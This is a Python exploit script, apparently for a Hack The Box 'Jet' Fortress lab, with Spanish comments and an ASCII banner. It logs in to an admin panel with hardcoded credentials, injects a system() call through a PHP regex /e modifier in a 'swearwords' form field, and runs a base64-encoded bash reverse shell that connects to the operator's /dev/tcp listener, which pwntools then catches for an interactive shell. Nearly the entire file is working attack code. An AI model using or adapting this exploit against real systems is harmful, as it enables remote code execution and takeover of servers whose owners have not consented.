import requests, signal, base64, argparse
from pwn import *

"""
Nota: Agregue www.securewebinc.jet al /etc/hosts
"""

BLACK = '\033[30m'
RED = '\033[31m'
GREEN = '\033[32m'
YELLOW = '\033[33m'
BLUE = '\033[34m'
MAGENTA = '\033[35m'
CYAN = '\033[36m'
WHITE = '\033[37m'
RESET = '\033[39m'

parse = argparse.ArgumentParser()
parse.add_argument('-lh', '--lhost', help="Tu IP")
parse.add_argument('-lp', '--lport', help="Puerto de escucha")
parse = parse.parse_args()

banner = f"""
{CYAN}     .-------------------------------------------------------------.
     |                              _                              |
     |                            > /                       .   '  |
     |                           /'/   ,        '            '  '  |
     |      ,--,.  ,    .     ' /'/                    ,           |
     |     <C-:`:`.      ,.    /'i            x/   '               |
     |      \\ \`:,2-.   \\ -.//.'           //  ,            '    |
     |       \\,>'v ;.`-. \::/  <      ,  ' /:                     |
     |        \\`. `.'`. `-'<;- .i +.    , /:'                     |
     |         \\ `. x _ </.`-:,. i)|.-.  /;'              ,       |
     |       ,:TX\ .2' . ':-.;;:-' -`.;;|/'/                       |
     |      ;','=>:,-' ,-'.-`-u._-'. `=.','`'-._                   |
     |     ' .'c;-  -.^,-' . .'  x,.-+-Y.c._ -._:=.     ,          |
     |       ;'. .- -.`.  ,-: ,- v`-._Y-.`-.  `---'                |
     |      <_ - doo `v' / `. .-' -'_  -<:-.:-._      ,            |
     |       2 -:    .C' . _,`;- ,'._ `-.=+: --.:-.                |
     |     ,: P  Y,c    i,^)_.+-<==.,__-'-..:_--.'; \              |
     |   .'c`+..=' i .._ ,-  _.+;,x;;.-  ``--+::_/  .>             |
     | .C.,- =``.  ;-   '` `'  ,' ,''               '              |
     |/   +  . _:-                  {RED} _________    _____  ________{CYAN}  |
    .' .:::)_.'                     {RED}dHHHHHHHHP   dHHHHP dHHHHHHP'{CYAN}  |
   / .::;:-'                         {RED}dHHP___  __  dHHP dHHP___{CYAN}     |
  /_;:-                             {RED}dHHHHHHP dHP HHHP dHHHHHHP{CYAN}     | 
     `---------------------------- {RED}dHHP ------- dHHP ____dHHP{CYAN} -----' 
                                  {RED}dHHP         dHHP dHHHHHHP{CYAN}
{YELLOW}JET FORTNESS
{BLUE}HACK THE BOX
{RED}Author: Alcatraz2033
"""

def ctrl_c(sig, frame):
    print(f"\n\n{RED}[!] Saliendo...{RESET}")
    exit(1)
    
signal.signal(signal.SIGINT, ctrl_c)

url = "http://www.securewebinc.jet"
code = f"bash -i >& /dev/tcp/{parse.lhost}/{parse.lport} 0>&1"
payload = base64.b64encode(code.encode()).decode("utf-8")

def send_request():

    s = requests.session()
    data = {
        'username' : 'admin',
        'password' : 'Hackthesystem200'
    }

    r = s.post(url + "/dirb_safe_dir_rf9EmcEIx/admin/dologin.php", data=data)

    data = {
        "swearwords[/fuck/i]" : "make love",
        "swearwords[/shit/i]" : "poop",
        "swearwords[/ass/i]" : "behind",
        "swearwords[/dick/i]" : "penis",
        "swearwords[/whore/e]" : f"system('echo {payload} | base64 -d | bash');",
        "swearwords[/asshole/i]" : "bad person",
        "to" : "user@user.com",
        "subject" : "user",
        "message" : "<p>whore</p>",
        "_wysihtml5_mode" : "1"
    }

    r = s.post(url + "/dirb_safe_dir_rf9EmcEIx/admin/email.php", data=data)

if __name__ == '__main__':

    if parse.lhost and parse.lport:
        try:
            print(banner)
            threading.Thread(target=send_request, args=()).start()
        except Exception as e:
            log.error(e)

        shell = listen(parse.lport, timeout=10).wait_for_connection()
        shell.interactive()
    else:
        print(f"{RED}[!] {RESET}Usage: python3 pwnJET.py -lh <local host> -lp <listen port>")    
